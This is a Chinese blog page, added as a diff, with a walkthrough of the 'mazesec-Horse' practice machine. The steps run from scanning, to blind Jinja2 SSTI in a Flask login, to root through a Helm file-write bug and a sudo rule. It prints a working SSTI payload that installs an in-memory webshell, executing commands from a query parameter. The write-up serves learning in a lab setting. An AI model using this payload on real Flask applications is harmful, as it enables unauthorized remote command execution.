@@ -1,0 +1,224 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>mazesec-Horse · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2025-11-19">2025年11月19日</time>
+        
+        
+          <span class="post__readtime">6 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/Maze/">#Maze</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">mazesec-Horse</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">sudo</span> arp-scan -I eth1 192.168.56.1/24</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> kali: </span><br><span class="line">Interface: eth1, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103</span><br><span class="line">WARNING: host part of 192.168.56.1/24 is non-zero</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:03       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:49:5f:2a       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.145  08:00:27:<span class="built_in">fc</span>:77:b2       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned <span class="keyword">in</span> 2.391 seconds (107.07 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nmap -p- 192.168.56.145 </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 05:00 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.145</span><br><span class="line">Host is up (0.0030s latency).</span><br><span class="line">Not shown: 65533 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 08:00:27:FC:77:B2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 107.50 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>8080端口是一个管理系统登录框, 无论输入什么账户&#x2F;密码都能够成功登录且会会显出用户名</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021352829.png" alt="image-20251119180421554"></p>
+<p>想用<code>&#123;&#123;7*7&#125;&#125;</code>测一下是否有SSTI模板注入漏洞，根据表面结果来看是没有的</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021352086.png" alt="image-20251119180613123"></p>
+<p>正当我没什么其他办法的时候,我打了这个一个SSTI payload <code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("__import__('os').popen('sleep%205').read()")&#125;&#125;</code></p>
+<p>页面确实正常返回了，但也是存在延时</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021352945.png" alt="image-20251119180809278"></p>
+<p>那就是存在SSTI模板注入漏洞只是没回显</p>
+<p>打一个内存马</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[abking].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda: CmdResp if __import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;request&#x27;].args.get(&#x27;abking&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;request&#x27;].args.get(\&#x27;abking\&#x27;)).read())\&quot;)==None else None)&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021352815.png" alt="image-20251119180924618"></p>
+<p>然后就可以命令执行 eecho用户</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021352962.png" alt="image-20251119181018947"></p>
+<p>然后我写一个公钥进去 ，ssh登上了eecho用户的账户</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021352478.png" alt="image-20251119181109109"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>eecho用户家目录下有一个带有s权限game 文件，貌似只是一个游戏文件？ </p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021353431.png" alt="image-20251119181208274"></p>
+<p>寻找其他带有s权限的文件</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021353406.png" alt="image-20251119181341805"></p>
+<p><code>helm</code>有这个权限</p>
+<p>然后<code>sudo -l</code> 发现我们有<code>(ALL) NOPASSWD: /bin/bash /opt/data</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021353979.png" alt="image-20251119181431079"></p>
+<p>那么思路就很明确了</p>
+<p>先输掉game游戏 清空<code>/opt/data</code>文件 </p>
+<p>然后用前端时间helm的那个文件写入漏洞把恶意命令写入到<code>/opt/data</code></p>
+<p>最后再<code>sudo /bin/bash /opt/data</code></p>
+<p>不过由于靶机不能访问外网。不能直接用GitHub上面的poc</p>
+<p>这里采用本地仓库的办法</p>
+<p>先在本地执行helm dependency update</p>
+<p>然后会在charts&#x2F;目录下生成一个gatekeeper-3.19.2.tgz文件</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021353482.png" alt="image-20251119182142412"></p>
+<p>把这个文件拿到靶机上面</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021353229.png" alt="image-20251119182241122"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021353767.png" alt="image-20251119182403953"></p>
+<p>然后创建Chart.yaml</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021353231.png" alt="image-20251119182645152"></p>
+<p>然后把Chart.lock连接到&#x2F;opt&#x2F;data</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021353057.png" alt="image-20251119182755385"></p>
+<p>然后运行game 故意输掉游戏 清空&#x2F;opt&#x2F;data</p>
+<p>刚才忘记改repository 这时候改一下</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021353389.png" alt="image-20251119182957165"></p>
+<p>清空之后运行helm dependency build</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021353398.png" alt="image-20251119183025833"></p>
+<p>然后执行<code>sudo /bin/bash /opt/data</code> 就行了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202601021353699.png" alt="image-20251119183213574"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-11-09">2025·11·09</time>
+          <a class="related__link" href="/2025/11/09/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-BabyShell/">mazesec-BabyShell</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-07-30">2025·07·30</time>
+          <a class="related__link" href="/2025/07/30/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Temp/">mazesec-Temp</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-05-06">2025·05·06</time>
+          <a class="related__link" href="/2025/05/06/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-awker/">mazesec-awker</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2026/03/26/CTF/%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%9A%A8%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9B_easy_time/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">第十九届全国大学生信息安全竞赛暨第三届“长城杯”铁人三项赛半决赛_easy_time</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/11/09/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-BabyShell/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">mazesec-BabyShell</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
